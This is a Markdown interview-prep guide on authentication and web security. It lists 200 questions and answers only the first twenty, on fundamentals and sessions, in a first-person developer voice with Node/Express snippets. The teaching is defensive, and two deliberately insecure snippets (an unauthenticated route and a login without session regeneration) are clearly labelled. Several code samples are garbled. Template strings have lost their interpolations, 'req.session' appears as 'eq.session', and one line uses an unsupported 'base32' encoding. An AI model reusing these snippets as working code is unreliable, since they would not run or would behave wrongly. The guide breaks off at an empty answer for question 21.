# Authentication & Security Interview Questions (200 Total)

---

# Authentication Fundamentals

1. What is authentication?
2. What is authorization?
3. What is the difference between authentication and authorization?
4. Why is authentication important?
5. What are the common authentication methods?
6. What is password-based authentication?
7. What is passwordless authentication?
8. What is multi-factor authentication (MFA)?
9. What is two-factor authentication (2FA)?
10. When should MFA be required?

---

# Session-Based Authentication

11. What is session-based authentication?
12. How do sessions work?
13. What is a session ID?
14. Where are sessions stored?
15. What are the advantages of session authentication?
16. What are the disadvantages of session authentication?
17. What is session fixation?
18. What is session hijacking?
19. How do you secure sessions?
20. When should you use session-based authentication?

---

# Cookies

21. What is an HTTP cookie?
22. What is the difference between cookies and localStorage?
23. What is the difference between cookies and sessionStorage?
24. What is an HttpOnly cookie?
25. What is the Secure cookie attribute?
26. What is the SameSite cookie attribute?
27. What are the values of SameSite?
28. What is a signed cookie?
29. What is a persistent cookie?
30. What cookie security best practices do you follow?

---

# JWT (JSON Web Token)

31. What is JWT?
32. Why was JWT introduced?
33. What are the three parts of a JWT?
34. How is a JWT generated?
35. How is a JWT verified?
36. What claims are commonly included in a JWT?
37. What is the difference between public and private claims?
38. What is the `exp` claim?
39. What is the `iat` claim?
40. What JWT best practices do you follow?

---

# Access & Refresh Tokens

41. What is an access token?
42. What is a refresh token?
43. What is the difference between access tokens and refresh tokens?
44. Why should access tokens have short expiration times?
45. How do refresh tokens work?
46. Where should refresh tokens be stored?
47. How do you revoke refresh tokens?
48. How do you implement logout with JWT?
49. How do you rotate refresh tokens?
50. What authentication architecture best practices do you follow?

---

# OAuth & OpenID Connect

51. What is OAuth 2.0?
52. Why was OAuth created?
53. What problem does OAuth solve?
54. How is OAuth different from authentication?
55. What are OAuth roles?
56. What is a Resource Owner?
57. What is a Client in OAuth?
58. What is an Authorization Server?
59. What is a Resource Server?
60. What are OAuth scopes?

---

# OAuth Flows

61. What is Authorization Code Flow?
62. What is Authorization Code Flow with PKCE?
63. What is Client Credentials Flow?
64. What is Implicit Flow?
65. Why is Implicit Flow no longer recommended?
66. What is Device Authorization Flow?
67. When should you use each OAuth flow?
68. How does Google Login work internally?
69. How does GitHub OAuth authentication work?
70. What OAuth security best practices do you follow?

---

# OpenID Connect (OIDC)

71. What is OpenID Connect?
72. How is OIDC different from OAuth 2.0?
73. What is an ID token?
74. What information does an ID token contain?
75. What is a userinfo endpoint?
76. What is a discovery endpoint?
77. What is JWKS?
78. How are OAuth tokens verified?
79. What is token introspection?
80. What OIDC best practices do you follow?

---

# Authorization

81. What is authorization?
82. What are the different authorization models?
83. What is Role-Based Access Control (RBAC)?
84. What is Attribute-Based Access Control (ABAC)?
85. What is Permission-Based Access Control?
86. What is the difference between roles and permissions?
87. How do you design an RBAC system?
88. How do you implement authorization middleware?
89. How do you handle resource-level permissions?
90. What authorization best practices do you follow?

---

# API Security

91. How do you secure REST APIs?
92. What is API authentication?
93. What is API authorization?
94. What are API keys?
95. When should you use API keys?
96. What are bearer tokens?
97. How do you protect API endpoints?
98. How do you prevent unauthorized API access?
99. What API security headers do you know?
100. What API security practices do you follow in production?

---

# OWASP & Common Attacks

101. What is OWASP?
102. What is OWASP Top 10?
103. Why should developers understand OWASP risks?
104. What is injection attack?
105. What is SQL Injection?
106. How does SQL Injection happen?
107. How do you prevent SQL Injection?
108. What is NoSQL Injection?
109. How do you prevent NoSQL Injection?
110. What is Command Injection?

---

# Cross-Site Scripting (XSS)

111. What is XSS?
112. What are the different types of XSS attacks?
113. What is Stored XSS?
114. What is Reflected XSS?
115. What is DOM-based XSS?
116. How does XSS affect users?
117. How do you prevent XSS attacks?
118. What is output encoding?
119. What is input sanitization?
120. What security practices prevent XSS?

---

# Cross-Site Request Forgery (CSRF)

121. What is CSRF?
122. How does a CSRF attack work?
123. Why are cookies vulnerable to CSRF?
124. How do you prevent CSRF attacks?
125. What is a CSRF token?
126. What is SameSite cookie protection?
127. What is the difference between CSRF and XSS?
128. When is CSRF protection required?
129. How does JWT authentication affect CSRF?
130. What CSRF prevention best practices do you follow?

---

# CORS & Browser Security

131. What is CORS?
132. Why does CORS exist?
133. How does the browser enforce CORS?
134. What is a preflight request?
135. What is an OPTIONS request?
136. What are CORS headers?
137. What is `Access-Control-Allow-Origin`?
138. What is `Access-Control-Allow-Credentials`?
139. How do you configure CORS securely?
140. What are common CORS mistakes?

---

# Encryption & Password Security

141. What is encryption?
142. What is the difference between encryption and hashing?
143. What is symmetric encryption?
144. What is asymmetric encryption?
145. What is TLS/HTTPS?
146. How does HTTPS work?
147. Why should passwords never be stored as plain text?
148. What is password hashing?
149. What are bcrypt, scrypt, and Argon2?
150. What password security best practices do you follow?

---

# Security Headers & Browser Protection

151. What are HTTP security headers?
152. Why are security headers important?
153. What is Content Security Policy (CSP)?
154. How does CSP prevent XSS attacks?
155. What is the `X-Frame-Options` header?
156. What is clickjacking?
157. What is the `X-Content-Type-Options` header?
158. What is HTTP Strict Transport Security (HSTS)?
159. What is the `Referrer-Policy` header?
160. What security headers should every production application use?

---

# Rate Limiting & Attack Prevention

161. What is rate limiting?
162. Why is rate limiting important?
163. How do you implement API rate limiting?
164. What is a token bucket algorithm?
165. What is a leaky bucket algorithm?
166. How do you prevent brute-force attacks?
167. How do you protect login endpoints?
168. What is account lockout?
169. What is CAPTCHA and when should it be used?
170. What attack prevention strategies do you follow?

---

# Multi-Factor Authentication & Identity

171. What is Multi-Factor Authentication (MFA)?
172. What are the different MFA methods?
173. How does TOTP-based authentication work?
174. What are authenticator apps?
175. What are backup codes?
176. How do you securely store MFA secrets?
177. What is Single Sign-On (SSO)?
178. How does SSO work?
179. What is SAML?
180. What is the difference between SAML and OAuth?

---

# Secrets & Infrastructure Security

181. What are application secrets?
182. Why should secrets not be stored in source code?
183. How do you manage environment variables securely?
184. What is secrets management?
185. What tools are used for secrets management?
186. How do you rotate secrets?
187. How do you secure database credentials?
188. How do you secure API keys?
189. What security practices do you follow in cloud environments?
190. How do you perform security audits?

---

# Senior Real-World Security Questions

191. Describe the most challenging security issue you have solved.
192. How do you perform a security review of an application?
193. How do you secure a full-stack Next.js + Node.js application?
194. How would you design authentication for a SaaS platform?
195. How would you design a role-based permission system?
196. How would you secure a payment application?
197. How would you handle a production data breach?
198. What security practices do you implement before deploying to production?
199. What security mistakes do junior developers commonly make?
200. In your opinion, what separates a junior, mid-level, and senior security-aware developer?

---


---

# ANSWERS

---

# Authentication Fundamentals (1-10)

## Question: What is authentication?

## Answer:
Authentication is the process of verifying the identity of a user, system, or entity. It answers the question Who are you? by validating credentials against a trusted source. In my experience, I implement authentication at every entry point of an application -- whether it's a web form, API endpoint, or service-to-service communication.

There are three main categories of authentication: something you know (passwords, PINs), something you have (security tokens, mobile devices), and something you are (biometrics like fingerprints or facial recognition). Modern applications often combine multiple factors for stronger security.

I typically implement authentication using established protocols like OAuth 2.0, OpenID Connect, or JWT-based systems rather than building custom solutions. The key principle is to never store raw passwords and to always use HTTPS to protect credentials in transit.

`javascript
// Example: Basic password verification
const bcrypt = require('bcrypt');
const isMatch = await bcrypt.compare(inputPassword, storedHash);
`

## Key Points:
- Authentication verifies identity (who are you?) while authorization determines access (what can you do?)
- Three factor categories: knowledge, possession, inherence
- Always use HTTPS to protect credentials in transit
- Never store raw passwords -- use bcrypt, scrypt, or Argon2
- Prefer established protocols (OAuth, OIDC) over custom solutions

## Interview Tip:
Always distinguish authentication from authorization clearly -- this is the most common follow-up question and demonstrates foundational understanding.

---

## Question: What is authorization?

## Answer:
Authorization is the process of determining what an authenticated user is allowed to do. While authentication verifies identity, authorization controls access to resources and actions. It answers the question What are you allowed to do? I implement authorization at multiple layers: route-level middleware, resource-level checks, and data-level filtering.

I typically use Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC) models. RBAC assigns permissions to roles, and users inherit permissions through role assignments. ABAC evaluates policies based on user attributes, resource attributes, and environmental conditions.

`javascript
// Example: RBAC middleware
function authorize(...allowedRoles) {
  return (req, res, next) => {
    const userRole = req.user.role;
    if (!allowedRoles.includes(userRole)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

app.delete('/api/users/:id', authorize('admin'), deleteUser);
`

Authorization should always be enforced server-side. Client-side checks improve UX but can be bypassed. I follow the principle of least privilege, granting users only the minimum permissions needed.

## Key Points:
- Authorization determines access rights after authentication
- Common models: RBAC (role-based), ABAC (attribute-based), ACL (access control lists)
- Always enforce authorization server-side -- client-side checks can be bypassed
- Apply the principle of least privilege
- Implement both route-level and resource-level authorization checks

## Interview Tip:
Explain how you'd handle both coarse-grained (role-based) and fine-grained (resource-level) authorization in the same system.

---

## Question: What is the difference between authentication and authorization?

## Answer:
Authentication and authorization are distinct but complementary security concepts. Authentication verifies identity -- it confirms you are who you claim to be. Authorization determines access -- it controls what you're allowed to see or do. Authentication always comes first; you must know who someone is before determining their permissions.

In my applications, authentication happens at login or token validation, while authorization happens on every request. I implement authentication using JWTs, sessions, or OAuth, and authorization using RBAC middleware, policy checks, or permission matrices.

A common analogy: authentication is like showing your ID at a security checkpoint, while authorization is like having the right badge to enter a specific room. Both are essential -- an unauthenticated user shouldn't access anything, and an authenticated user shouldn't access resources outside their permissions.

`javascript
// Authentication: Verify identity
const user = await verifyToken(req.headers.authorization);

// Authorization: Check permissions
if (user.role !== 'admin' && resource.ownerId !== user.id) {
  throw new ForbiddenError();
}
`

## Key Points:
- Authentication = identity verification; authorization = access control
- Authentication always precedes authorization
- They serve different purposes and require different mechanisms
- Both must be implemented for a secure system
- Authentication can fail (401 Unauthorized); authorization fails with (403 Forbidden)

## Interview Tip:
Use the ID badge analogy -- authentication is verifying the badge holder's identity, authorization is what doors the badge opens.

---

## Question: Why is authentication important?

## Answer:
Authentication is critical because it's the foundation of security for any application. Without proper authentication, anyone could impersonate any user, access private data, or perform unauthorized actions. I've seen breaches where weak or missing authentication led to massive data leaks.

Authentication protects sensitive data, ensures accountability through audit trails, and maintains trust between users and the application. Regulatory compliance (GDPR, HIPAA, PCI-DSS) also mandates strong authentication mechanisms.

I implement authentication as the first line of defense, ensuring every user is verified before accessing any resource. I also ensure authentication logs are maintained for forensic purposes and that suspicious login attempts are detected and blocked.

`javascript
// Without authentication, anyone can access protected routes
app.get('/api/profile', (req, res) => {
  // DANGEROUS: No authentication check
  res.json(database.getUserProfile(req.query.userId));
});

// With authentication
app.get('/api/profile', authenticate, (req, res) => {
  res.json(database.getUserProfile(req.user.id));
});
`

## Key Points:
- Prevents unauthorized access to sensitive data and functionality
- Ensures accountability and audit trail integrity
- Required for regulatory compliance (GDPR, HIPAA, PCI-DSS)
- Maintains user trust and application integrity
- Foundation for all other security measures

## Interview Tip:
Cite specific data breaches or compliance requirements to demonstrate real-world understanding.

---

## Question: What are the common authentication methods?

## Answer:
I work with several authentication methods depending on the use case. Password-based authentication is the most common but requires careful implementation with proper hashing (bcrypt/Argon2). Multi-factor authentication (MFA) adds a second verification layer, significantly reducing account compromise risk.

Token-based authentication using JWTs or OAuth tokens is ideal for distributed systems and APIs. Session-based authentication with server-side sessions is simpler for traditional web apps. Certificate-based authentication (mTLS) is used for service-to-service communication. Biometric authentication (fingerprint, face recognition) is increasingly common in mobile applications.

Passwordless methods like magic links, WebAuthn/FIDO2, and hardware security keys are gaining popularity because they eliminate password-related vulnerabilities. I choose the method based on security requirements, user experience, and system architecture.

`javascript
// Password-based auth
const isValid = await bcrypt.compare(password, user.passwordHash);

// Token-based auth (JWT)
const token = jwt.sign({ userId: user.id }, secret, { expiresIn: '1h' });

// OAuth 2.0
const authUrl = https://accounts.google.com/o/oauth2/auth?client_id=&redirect_uri=&scope=email&response_type=code;

// Magic link (passwordless)
const magicToken = crypto.randomBytes(32).toString('hex');
await sendEmail(user.email, Click here to login: /auth/magic/);
`

## Key Points:
- Password-based: common but vulnerable without proper hashing
- MFA/2FA: significantly reduces account compromise risk
- Token-based (JWT): ideal for distributed systems and APIs
- Session-based: simple for traditional web applications
- Passwordless (magic links, WebAuthn): eliminate password vulnerabilities
- Certificate-based (mTLS): used for service-to-service communication

## Interview Tip:
Discuss trade-offs between security and user experience for each method.

---

## Question: What is password-based authentication?

## Answer:
Password-based authentication verifies a user's identity by matching a provided password against a stored hash. It's the most traditional form of authentication, but if implemented incorrectly, it's also one of the most vulnerable. I always store passwords using strong hashing algorithms like bcrypt, scrypt, or Argon2 -- never plain text.

The flow is straightforward: the user submits credentials, the server hashes the input password and compares it to the stored hash, and if they match, a session or token is issued. I enforce strong password policies (minimum length, complexity requirements), implement rate limiting on login attempts, and use account lockout after repeated failures.

I never log passwords or include them in error messages. Password reset flows use time-limited tokens sent via email, and I always enforce HTTPS to prevent credential interception.

`javascript
// Password hashing with bcrypt
const saltRounds = 12;
const hash = await bcrypt.hash(password, saltRounds);
await db.createUser({ email, passwordHash: hash });

// Verification
const user = await db.findUserByEmail(email);
const isValid = user && await bcrypt.compare(password, user.passwordHash);
if (!isValid) throw new InvalidCredentialsError();
`

## Key Points:
- Always hash passwords with bcrypt (12+ rounds), scrypt, or Argon2
- Enforce strong password policies (min 12 characters, complexity)
- Implement rate limiting and account lockout on failed attempts
- Never store, log, or include passwords in error messages
- Use time-limited tokens for password resets

## Interview Tip:
Emphasize that you never store plain text passwords and explain why you chose bcrypt/scrypt over MD5/SHA.

---

## Question: What is passwordless authentication?

## Answer:
Passwordless authentication verifies identity without requiring a traditional password. I implement this using magic links (email-based tokens), biometrics (WebAuthn/FIDO2), hardware security keys (YubiKey), or one-time codes. These methods eliminate password-related vulnerabilities like brute-force attacks, credential stuffing, and phishing.

Magic links send a time-limited token to the user's email -- clicking the link verifies their identity. WebAuthn uses public-key cryptography tied to the user's device, providing strong phishing resistance. I use libraries like simplewebauthn for WebAuthn implementation.

`javascript
// Magic link implementation
const token = crypto.randomBytes(32).toString('hex');
await redis.set(magic:, userId, 'EX', 900); // 15 min expiry
await emailService.send(user.email, Login: /auth/verify/);

// WebAuthn registration
const registrationOptions = await simplewebauthn.generateRegistrationOptions({
  rpName: 'My App',
  rpID: 'example.com',
  user: { id: user.id, name: user.email, displayName: user.name },
});
`

Passwordless methods improve UX (no passwords to remember) while often providing stronger security. I implement them as either the primary method or as an alternative to password-based login.

## Key Points:
- Eliminates password-related vulnerabilities (brute-force, credential stuffing)
- Common methods: magic links, WebAuthn/FIDO2, hardware keys, biometrics
- WebAuthn provides the strongest phishing resistance
- Improves UX by removing password management burden
- Can be primary or supplementary authentication method

## Interview Tip:
Explain how WebAuthn works at a high level -- it uses public-key cryptography, making it phishing-resistant.

---

## Question: What is multi-factor authentication (MFA)?

## Answer:
Multi-factor authentication requires two or more independent verification factors to confirm identity. The three factor categories are: knowledge (something you know, like a password), possession (something you have, like a phone or security key), and inherence (something you are, like a fingerprint). MFA dramatically reduces account compromise -- even if one factor is stolen, the attacker still needs the other(s).

I implement MFA using TOTP (Time-based One-Time Passwords) via authenticator apps, SMS/email codes (less secure), or hardware security keys (most secure). I use libraries like speakeasy or otplib for TOTP generation and verification.

`javascript
// TOTP-based MFA setup
const speakeasy = require('speakeasy');
const secret = speakeasy.generateSecret({ name: 'MyApp' });
// Store secret.otpauth_url in user's profile
await db.saveUserMFA(userId, secret.base32);

// Verification during login
const isVerified = speakeasy.totp.verify({
  secret: user.mfaSecret,
  encoding: 'base32',
  token: inputToken,
  window: 1 // Allow 1 step deviation
});
`

I enforce MFA for sensitive operations (admin dashboards, financial transactions) and offer it as an optional but encouraged feature for regular users. I also provide backup recovery codes for when users lose their primary MFA device.

## Key Points:
- Requires 2+ independent factors: knowledge, possession, inherence
- Reduces account compromise even if one factor is compromised
- TOTP (authenticator apps) is most common implementation
- Hardware security keys provide strongest security
- Provide backup recovery codes for device loss

## Interview Tip:
Know the difference between TOTP and HOTP, and why TOTP is preferred (time-based prevents replay attacks).

---

## Question: What is two-factor authentication (2FA)?

## Answer:
Two-factor authentication is a specific type of MFA that requires exactly two verification factors. It typically combines a password (knowledge factor) with a time-based code from an authenticator app or SMS (possession factor). I implement 2FA using TOTP standards compatible with apps like Google Authenticator, Authy, or Microsoft Authenticator.

The implementation involves generating a secret key during setup, storing it securely, and verifying 6-digit codes at login. I use a 30-second time window with a 1-step tolerance to account for clock drift.

`javascript
// 2FA setup
const crypto = require('crypto');
const secret = crypto.randomBytes(20).toString('base32');
const otpauthUrl = otpauth://totp/MyApp:?secret=&issuer=MyApp;
// Show QR code with otpauthUrl to user
await db.storeMFAConfig(userId, { secret, enabled: false });

// 2FA verification at login
function verifyTOTP(secret, token) {
  const buffer = Math.floor(Date.now() / 30000);
  return speakeasy.totp.verify({
    secret,
    encoding: 'base32',
    token,
    step: 30,
    window: 1
  });
}
`

While SMS-based 2FA is better than nothing, I prefer authenticator apps or hardware keys because SMS is vulnerable to SIM-swapping attacks. I always offer backup codes as a recovery option.

## Key Points:
- Requires exactly two factors (typically password + TOTP code)
- TOTP codes are generated every 30 seconds
- Authenticator apps are more secure than SMS (vulnerable to SIM-swapping)
- Must provide backup codes for recovery
- Implement with proper time window tolerance for clock drift

## Interview Tip:
Be ready to explain why TOTP is preferred over SMS-based 2FA -- SIM-swapping attacks are a real threat.

---

## Question: When should MFA be required?

## Answer:
I implement MFA in several scenarios based on risk assessment. Admin dashboards and privileged accounts always require MFA -- these are high-value targets. Financial transactions, sensitive data access, and account settings changes (like email or password updates) should also trigger MFA. I also require MFA when users log in from new devices, unusual locations, or after extended inactivity.

For regular users, I offer MFA as an optional but encouraged feature with incentives (badges, increased limits). I consider the application's threat model -- a banking app needs stricter requirements than a blog.

I implement adaptive MFA that evaluates risk signals: new IP address, unusual time of access, multiple failed attempts, or changes in device fingerprint. Low-risk actions proceed normally, while high-risk actions trigger MFA challenges.

`javascript
// Adaptive MFA example
async function shouldRequireMFA(user, request) {
  const isNewDevice = !await isKnownDevice(user.id, request.fingerprint);
  const isUnusualLocation = !isNearLastLocation(user.id, request.ip);
  const isSensitiveAction = ['transfer', 'password_change'].includes(request.action);
  
  if (isSensitiveAction || isNewDevice || isUnusualLocation) {
    return true;
  }
  return user.mfaEnforced;
}
`

## Key Points:
- Always require for admin/privileged accounts and sensitive operations
- Implement adaptive MFA based on risk signals (new device, unusual location)
- Offer as optional but encouraged for regular users
- Consider threat model when deciding MFA strictness
- Balance security requirements with user friction

## Interview Tip:
Mention adaptive/risk-based MFA -- it shows you understand balancing security with user experience.


---

# Session-Based Authentication (11-20)

## Question: What is session-based authentication?

## Answer:
Session-based authentication maintains user state on the server after initial login. When a user logs in, the server creates a session object storing user data, generates a unique session ID, and sends it to the client as a cookie. Each subsequent request includes this session ID, allowing the server to retrieve the session data and verify the user.

I implement session-based auth using middleware like express-session with secure configuration. Sessions are stored server-side (in memory, Redis, or a database), and only the session ID is sent to the client. This keeps sensitive data on the server while maintaining stateless HTTP semantics.

`javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
    sameSite: 'strict'
  }
}));

// Login endpoint
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  req.session.userId = user.id;
  res.json({ message: 'Logged in' });
});
`

Session-based auth is simpler for traditional web apps but doesn't scale as easily as stateless token-based approaches. I prefer it for server-rendered applications where all traffic goes through the same server.

## Key Points:
- Server maintains state; client only holds session ID
- Session ID sent via cookie; actual data stored server-side
- Simpler to implement and revoke than token-based auth
- Better for server-rendered applications
- Doesn't scale horizontally as easily without shared session store

## Interview Tip:
Explain when you'd choose sessions vs. JWTs -- sessions for monolithic web apps, JWTs for microservices.

---

## Question: How do sessions work?

## Answer:
Sessions work by creating a server-side state record after successful authentication. When a user logs in, the server generates a unique session ID, stores session data (user ID, roles, permissions) in a session store, and sends the session ID to the client as a cookie. The client includes this cookie in every request, allowing the server to look up and validate the session.

The flow is: login -> create session -> send session ID as cookie -> client sends cookie on subsequent requests -> server validates session ID -> server retrieves session data -> server processes request.

I configure sessions with security best practices: httpOnly prevents JavaScript access, secure ensures HTTPS-only transmission, sameSite prevents CSRF attacks, and appropriate maxAge limits session lifetime.

`javascript
// Session lifecycle
// 1. Login: Create session
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  req.session.regenerate((err) => {
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ success: true });
  });
});

// 2. Subsequent request: Session middleware reads cookie
app.get('/api/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  res.json({ userId: req.session.userId });
});

// 3. Logout: Destroy session
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    res.clearCookie('connect.sid');
    res.json({ message: 'Logged out' });
  });
});
`

## Key Points:
- Server creates session after successful authentication
- Session ID sent to client as cookie
- Client sends session ID with every request
- Server validates session ID and retrieves stored data
- Proper cookie attributes (httpOnly, secure, sameSite) are essential

## Interview Tip:
Draw out the session flow on paper -- login creates session, cookie is set, subsequent requests include cookie.

---

## Question: What is a session ID?

## Answer:
A session ID is a unique, randomly generated identifier that maps to a server-side session record. It acts as a key to retrieve user state without storing sensitive data on the client. I generate session IDs using cryptographically secure random functions to prevent guessing or prediction.

The session ID should be at least 128 bits (32 hex characters) of randomness. I use libraries like express-session which handle ID generation securely. The ID is sent as a cookie and never contains user data -- only a reference to the server-side store.

A compromised session ID allows session hijacking, so I protect it with secure cookie attributes and implement session rotation after login. I also monitor for session anomalies like IP changes or concurrent sessions from different locations.

## Key Points:
- Unique identifier mapping to server-side session storage
- Must be cryptographically random (128+ bits)
- Contains no user data -- only a reference key
- Protected via cookie security attributes
- Session ID compromise = account compromise

## Interview Tip:
Emphasize that session IDs must be unpredictable -- explain why you'd use crypto.randomBytes over Math.random().

---

## Question: Where are sessions stored?

## Answer:
Sessions are stored server-side in various backends depending on scalability needs. For development and single-server deployments, I use in-memory storage (default in express-session). For production, I use Redis, Memcached, or a database like PostgreSQL.

Redis is my preferred choice because it's fast, supports expiration natively, and handles high concurrency well. For multi-server deployments, a shared session store is essential so any server can handle a user's request.

`javascript
// Redis session store (production)
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

const redisClient = createClient({ url: process.env.REDIS_URL });
redisClient.connect();

app.use(session({
  store: new RedisStore({ 
    client: redisClient,
    prefix: 'sess:'  // Key prefix in Redis
  }),
  secret: process.env.SESSION_SECRET,
  cookie: { secure: true, httpOnly: true, maxAge: 86400000 }
}));
`

I never store sessions in localStorage or the browser -- that defeats the purpose of server-side sessions. I also ensure sessions have TTL (time-to-live) configured so abandoned sessions are automatically cleaned up.

## Key Points:
- Always server-side: Redis (preferred), Memcached, database, or in-memory
- In-memory is for development only -- lost on restart, doesn't scale
- Redis preferred for production: fast, supports TTL, handles concurrency
- Shared session store required for multi-server deployments
- Configure TTL for automatic cleanup of stale sessions

## Interview Tip:
Know why in-memory is bad for production -- server restart loses all sessions, can't scale horizontally.

---

## Question: What are the advantages of session authentication?

## Answer:
Session authentication has several advantages I leverage in specific scenarios. Sessions are simple to implement and understand -- the server controls everything, making state management straightforward. Revocation is instant: deleting the session immediately logs out the user, unlike JWTs which remain valid until expiration.

Sessions are more secure for web applications because the session ID stays in an httpOnly cookie, inaccessible to JavaScript. This eliminates XSS-based token theft. Session data stays on the server, so no sensitive information is exposed to the client.

For traditional web apps with server-side rendering, sessions integrate naturally with server frameworks. I also find sessions easier to debug since all state is centralized on the server.

However, sessions don't scale well for distributed systems without a shared store, and they create server-side memory overhead. I choose sessions for monolithic web apps and JWTs for APIs and microservices.

## Key Points:
- Simple to implement and understand
- Instant revocation -- just delete the session
- Sensitive data stays server-side, not exposed to client
- httpOnly cookies protect against XSS token theft
- Ideal for server-rendered web applications
- Doesn't scale well without shared session store

## Interview Tip:
Contrast with JWT advantages -- sessions for web apps, JWTs for distributed systems.

---

## Question: What are the disadvantages of session authentication?

## Answer:
Session authentication has several limitations I consider when choosing an architecture. The primary disadvantage is scalability -- sessions are stored server-side, requiring either sticky sessions or a shared session store (Redis) for multi-server deployments. This adds infrastructure complexity and latency.

Sessions create server-side memory overhead, especially with millions of concurrent users. Each active session consumes memory, and while TTL helps, peak usage can be problematic. Session-based auth doesn't work well for mobile apps and SPAs that need stateless authentication across multiple domains.

CORS and cross-domain scenarios are difficult with sessions because cookies don't travel well across different origins. For modern architectures (microservices, serverless, SPAs), I prefer JWT-based authentication because it's stateless and scales horizontally without shared infrastructure.

## Key Points:
- Scalability challenge -- requires shared store or sticky sessions
- Server-side memory overhead with many concurrent users
- Doesn't work well across different domains/origins
- Not ideal for SPAs and mobile apps
- Requires additional infrastructure (Redis) for production
- Unsuitable for microservice architectures without centralization

## Interview Tip:
Be honest about limitations but explain when sessions are still the right choice.

---

## Question: What is session fixation?

## Answer:
Session fixation is an attack where an attacker sets a known session ID before the user authenticates. If the application doesn't generate a new session after login, the attacker can use the known session ID to hijack the authenticated session. This is a critical vulnerability I always protect against.

The attack works like this: attacker visits the site, gets a session ID, tricks the victim into using that session ID (via URL parameter or cookie injection), then waits for the victim to authenticate. The attacker then uses the same session ID to access the authenticated session.

I prevent session fixation by regenerating the session ID after successful authentication using eq.session.regenerate(). This ensures the old session ID is invalidated.

`javascript
// VULNERABLE: No session regeneration after login
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  req.session.userId = user.id; // Attacker's session ID persists!
  res.json({ success: true });
});

// SECURE: Regenerate session after login
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  req.session.regenerate((err) => {
    req.session.userId = user.id; // New session ID generated
    res.json({ success: true });
  });
});
`

## Key Points:
- Attacker pre-sets a session ID before user authenticates
- Exploited when session ID doesn't change after login
- Prevented by regenerating session ID after successful authentication
- Critical vulnerability that leads to full account takeover
- Use eq.session.regenerate() in Node.js/Express

## Interview Tip:
Explain the attack step-by-step -- it demonstrates deep understanding of session security.

---

## Question: What is session hijacking?

## Answer:
Session hijacking occurs when an attacker obtains a valid session ID and uses it to impersonate the legitimate user. This can happen through XSS attacks (stealing cookies via JavaScript), network sniffing (intercepting unencrypted traffic), or physical access to the client machine.

I protect against session hijacking with multiple defense layers: httpOnly cookies prevent JavaScript access, secure cookies enforce HTTPS, rotating session IDs after sensitive operations, and monitoring for suspicious session activity like IP changes or concurrent access from different locations.

XSS is the most common vector for session hijacking in web apps. An attacker injects malicious JavaScript that reads the session cookie and sends it to their server. This is why httpOnly is non-negotiable for session cookies.

`javascript
// Cookie protection against session hijacking
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,   // Prevents JavaScript access
    secure: true,     // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 86400000  // 24 hours
  }
}));

// Session rotation after sensitive operations
app.post('/change-password', (req, res) => {
  req.session.regenerate((err) => {
    req.session.userId = req.user.id;
    res.json({ message: 'Password changed, session refreshed' });
  });
});
`

## Key Points:
- Attacker obtains and uses valid session ID to impersonate user
- Common vectors: XSS, network sniffing, physical access
- httpOnly cookies prevent JavaScript-based session theft
- secure cookies ensure HTTPS-only transmission
- Rotate session IDs after sensitive operations
- Monitor for IP changes and concurrent access anomalies

## Interview Tip:
Connect session hijacking to XSS -- it shows you understand how attacks chain together.

---

## Question: How do you secure sessions?

## Answer:
I secure sessions using multiple defense layers. Cookie attributes are critical: httpOnly prevents JavaScript access, secure ensures HTTPS-only, sameSite prevents CSRF, and maxAge limits lifetime. I use cryptographically strong session IDs (128+ bits), regenerate them after login, and rotate them after sensitive operations.

I store sessions in Redis with TTL, implement rate limiting on authentication endpoints, and monitor for anomalies like IP changes or impossible travel. For production, I use a separate session store with its own security configuration.

`javascript
// Secure session configuration
app.use(session({
  store: new RedisStore({ client: redisClient, prefix: 'sess:' }),
  secret: process.env.SESSION_SECRET,
  name: 'app.sid',  // Don't use default name
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000,  // 1 hour
    domain: '.myapp.com'  // Specific domain
  }
}));
`

Additional measures: destroy sessions on logout, implement idle timeouts, limit concurrent sessions per user, and use CSRF tokens for form submissions. I also ensure the session secret is cryptographically strong and stored in environment variables.

## Key Points:
- Cookie attributes: httpOnly, secure, sameSite, maxAge, domain
- Strong session IDs (128+ bits), regenerated after login
- Redis with TTL for production session storage
- Monitor for anomalies (IP changes, concurrent access)
- Destroy sessions on logout, implement idle timeouts
- Limit concurrent sessions per user

## Interview Tip:
List the cookie attributes and explain what each one prevents.

---

## Question: When should you use session-based authentication?

## Answer:
I choose session-based authentication for traditional server-rendered web applications where all requests go through the same server or a load-balanced cluster with shared session storage. Sessions work well when you need instant revocation (like admin dashboards), when security is paramount (sessions don't expose data to clients), and when the application is monolithic.

Sessions are ideal when: the frontend and backend are on the same domain, you need server-side state control, you want simple logout (destroy session), or you're building a simple CRUD application without microservice requirements.

I avoid sessions when: building SPAs with separate API servers, implementing microservice architectures, supporting mobile apps, or requiring cross-domain authentication. In those cases, JWT-based auth is more appropriate.

`javascript
// Session-based: Good for traditional web apps
app.get('/dashboard', authenticateSession, (req, res) => {
  res.render('dashboard', { user: req.session });
});

// JWT-based: Better for APIs and microservices
app.get('/api/data', authenticateToken, (req, res) => {
  res.json({ data: 'value' });
});
`

## Key Points:
- Ideal for traditional server-rendered web applications
- Best when frontend/backend are on the same domain
- Good when instant revocation is important
- Avoid for SPAs, microservices, and mobile apps
- Requires shared session store for multi-server deployments
- Simpler than JWT for monolithic architectures

## Interview Tip:
Give a clear decision framework: sessions for monolithic web apps, JWTs for distributed systems.


---

# Cookies (21-30)

## Question: What is an HTTP cookie?

## Answer:
